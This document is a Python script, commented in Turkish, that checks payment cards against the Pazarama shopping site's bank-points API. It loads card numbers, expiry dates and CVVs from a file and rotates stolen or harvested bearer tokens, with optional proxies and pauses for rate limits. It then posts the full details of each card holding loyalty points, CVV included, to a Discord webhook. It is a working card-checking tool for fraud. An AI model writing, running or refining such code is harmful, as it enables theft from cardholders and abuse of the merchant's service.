import requests
import json
import hashlib
import time
import random
import uuid

# Constants
WEBHOOK_URL = "webhook"

# Basit token test fonksiyonu
def test_token(token):
    """Token'ın geçerli olup olmadığını test et"""
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
        }

        # Basit bir GET request ile test edelim
        response = requests.get('https://bff.pazarama.com/v2/me', headers=headers, timeout=10)
        print(f"TOKEN TEST: Status {response.status_code}")
        if response.status_code == 200:
            print("TOKEN GECERLI!")
            return True
        else:
            print(f"TOKEN GECERSIZ! Status: {response.status_code}")
            return False
    except Exception as e:
        print(f"TOKEN TEST HATASI: {str(e)}")
        return False

def send_to_discord(message):
    """Send message to Discord webhook"""
    try:
        payload = {
            'content': message,
            'username': 'Pazaramalternatif Puan Checker'
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print("Discord sent")
    except:
        print("Discord failed")

def load_tokens():
    """Load Bearer tokens"""
    try:
        with open('auth_keys.txt', 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_proxies():
    """Load HTTP proxies"""
    try:
        with open('proxy_tokens.txt', 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_cards():
    """Load cards"""
    try:
        with open('cards.txt', 'r', encoding='utf-8') as f:
            cards = []
            for line in f:
                if line.strip():
                    parts = line.strip().split('|')
                    if len(parts) == 4:
                        cards.append({
                            'card_number': parts[0],
                            'expiry_month': parts[1],
                            'expiry_year': parts[2],
                            'cvv': parts[3]
                        })
            return cards
    except:
        return []

def check_card(card, token, proxy=None):
    """Check card points"""
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Referer': 'https://www.pazarama.com/hesabim/puanlarim/puan-aktar?from=tatil',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'x-channel-code': '2',
            'x-channelcode': '2',
            'x-companycode': '1',
            'x-deviceid': '055b47cc-d015-4bc5-854d-f6f6c02a4a62',
            'x-lang-code': 'tr',
            'x-platform': '1',
            'ordertype': '8'
        }

        payload = {
            "cardInfo": {
                "cardNumber": card['card_number'],
                "expMonth": card['expiry_month'],
                "expYear": f"20{card['expiry_year']}",
                "cvcNumber": card['cvv'],
                "pointType": 1
            },
            "getLoyaltyPoints": True,
            "pointType": 1
        }

        payload_json = json.dumps(payload, separators=(',', ':'))
        headers['x-payload-hash'] = hashlib.sha256(payload_json.encode('utf-8')).hexdigest()

        # HTTP proxy
        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None

        print(f"DEBUG: API'ye istek gönderiliyor - Kart: {card['card_number'][-4:]}...")
        response = requests.post(
            'https://bff.pazarama.com/v2/me/card/bank-points',
            headers=headers,
            json=payload,
            proxies=proxies,
            timeout=15
        )

        print(f"DEBUG: Response status: {response.status_code}")

        if response.status_code == 429:
            return {'success': False, 'error': 'Rate limited'}

        if response.status_code != 200:
            return {'success': False, 'error': f'HTTP {response.status_code}'}

        print(f"HTTP Status: {response.status_code}")

        try:
            data = response.json()
            print(f"API Success: {data.get('success')}")
        except Exception as e:
            print(f"JSON Error: {e}")
            return {'success': False, 'error': f'JSON Parse Error'}

        if not data.get('success', False):
            return {'success': False, 'error': data.get('userMessage', 'API Error')}

        # Yeni API formatında puan bilgileri data.points içinde
        points = data.get('data', {}).get('points', [])
        maxi_puan = '0'
        pazarama_puan = '0'

        for point in points:
            if point.get('pointName') == 'MaxiPuan':
                maxi_puan = str(point.get('pointAmount', {}).get('value', '0'))
            elif point.get('pointName') == 'PazaramaPuan':
                pazarama_puan = str(point.get('pointAmount', {}).get('value', '0'))

        return {
            'success': True,
            'maxi_puan': maxi_puan,
            'pazarama_puan': pazarama_puan
        }

    except Exception as e:
        return {'success': False, 'error': str(e)}

def main():
    print("=== PAZARAMALTERNATIF PUAN CHECKER BASLATILIYOR ===")

    tokens = load_tokens()

    # Token test et
    if tokens:
        print("TOKEN TEST EDILIYOR...")
        test_token(tokens[0])
    proxies = load_proxies()
    cards = load_cards()

    print(f"Yuklenen veriler: {len(tokens)} token, {len(proxies)} proxy, {len(cards)} kart")

    if not tokens:
        print("HATA: Token bulunamadi!")
        return

    if not cards:
        print("HATA: Kart bulunamadi!")
        return

    print(f"Ilk token: {tokens[0][:50]}...")
    print(f"Ilk proxy: {proxies[0] if proxies else 'Proxy kullanilmayacak'}")
    print(f"Ilk kart: {cards[0]['card_number'] if cards else 'Kart yok'}")

    print("Kart kontrolu basliyor...")
    start_time = time.time()

    for card in cards:
        card_last4 = card['card_number'][-4:]

        token = random.choice(tokens)
        proxy = None  # Şimdilik proxy kullanma

        result = check_card(card, token, proxy)

        if result['success']:
            maxi_puan = result['maxi_puan']
            pazarama_puan = result['pazarama_puan']
            try:
                maxi_float = float(maxi_puan.replace(',', '.'))
                if maxi_float > 0:
                    from datetime import datetime
                    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                    message = f"""💳 KART BULUNDU!
Kart Numarası: {card['card_number']}
Son Kullanma: {card['expiry_month']}/{card['expiry_year']}
CVV: {card['cvv']}
MaxiPuan: {maxi_puan}
PazaramaPuan: {pazarama_puan}
Tarih: {current_time}"""

                    send_to_discord(message)
                    print(f"SUCCESS: {card['card_number']} - MaxiPuan: {maxi_puan}")
                else:
                    print(f"ZERO: {card['card_number']} - MaxiPuan: 0")
            except:
                print(f"SUCCESS: {card['card_number']} - MaxiPuan: {maxi_puan}")
        else:
            error_msg = result['error']
            print(f"FAILED: {card['card_number']} - HATA: {error_msg}")

            if "Rate limited" in error_msg:
                print("Rate limited - 15 saniye bekleniyor...")
                time.sleep(15)
            elif "devam edilemiyor" in error_msg or "PAY-291" in error_msg:
                error_discord = f"""❌ TOKEN HATASI
Kart Numarası: {card['card_number']}
Son Kullanma: {card['expiry_month']}/{card['expiry_year']}
CVV: {card['cvv']}
Hata: Token suresi dolmus
Cozum: Yeni token alin!"""
                send_to_discord(error_discord)

        time.sleep(5)  # Rate limit için daha uzun bekleme

    end_time = time.time()
    duration = int(end_time - start_time)

    completion_message = f"""PUAN KONTROLU TAMAMLANDI
Toplam Kart: {len(cards)}
Gecen Sure: {duration} saniye
Durum: Basariyla tamamlandi"""

    send_to_discord(completion_message)
    print(f"Islem tamamlandi! {len(cards)} kart kontrol edildi, {duration} saniye surdu.")

if __name__ == "__main__":
    main()
